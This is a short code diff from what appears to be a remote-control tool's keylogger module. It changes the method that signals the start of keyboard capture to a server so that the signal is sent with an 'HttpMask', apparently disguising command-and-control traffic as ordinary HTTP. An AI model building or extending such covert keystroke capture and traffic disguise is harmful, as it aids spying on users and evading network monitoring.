@@ -77,8 +77,8 @@ int CKeyboardManager1::sendStartKeyBoard()
     BYTE	bToken[2];
     bToken[0] = TOKEN_KEYBOARD_START;
     bToken[1] = (BYTE)m_bIsOfflineRecord;
-
-    return m_ClientObject->Send2Server((char*)&bToken[0], sizeof(bToken));
+    HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+    return m_ClientObject->Send2Server((char*)&bToken[0], sizeof(bToken), &mask);
 }
 
 
